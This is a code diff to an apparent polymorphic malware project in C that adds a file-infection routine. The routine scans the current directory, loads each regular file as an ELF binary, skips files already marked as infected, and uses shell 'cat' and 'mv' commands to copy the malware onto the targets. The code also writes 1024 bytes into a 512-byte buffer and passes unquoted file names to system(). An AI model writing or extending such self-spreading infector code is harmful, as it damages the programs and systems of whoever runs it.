@@ -5,6 +5,9 @@
 
 #include <dirent.h>
 
+/// Hardcoded size of the generated elf executable in bytes
+#define POLYV_CLIENT_SIZE 34504
+
 /// Main entry point of the malware 
 int POLYV_ENCRYPTED payload(int argc, char* argv[]) {
     printf("Hello, Hidden!\n");
@@ -13,16 +16,40 @@ int POLYV_ENCRYPTED payload(int argc, char* argv[]) {
     if (!(dir = opendir(".")))
         return -1;
 
-    char path[1024];
+    char target_path[512];
     struct dirent* entry;
 
-    printf("Directories:\n");
+    printf("Infection:\n");
     while((entry = readdir(dir)) != NULL) {
-        if (entry->d_type == DT_DIR)
-            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+
+        // Copy itself on top of every executable on the directory
+        if (entry->d_type == DT_REG) {
+            snprintf(target_path, 1024, "./%s", entry->d_name);
+            
+            elf64 elf;
+            if (!polyv_load_elf64(&elf, target_path))
                 continue;
-        
-        printf("  %s\n", entry->d_name);
+
+            // Check if already infected
+            const Elf64_Shdr* etext = polyv_lookup_section(&elf, POLYV_ENCRYPTED_SECTION);
+            if (etext != NULL) {
+                polyv_unload_elf64(&elf);
+                continue;
+            }
+
+            polyv_unload_elf64(&elf);
+
+            // For now use the shell
+            char command[1024];
+            snprintf(command, 1024, "cat %s >> %s", argv[0], target_path);
+            system(command);
+            snprintf(command, 1024, "mv %s %s", target_path, argv[0]);
+            system(command);
+
+            // We have a target!
+            printf("  %s\n", entry->d_name);
+            
+        }
     }
 
     return 0;
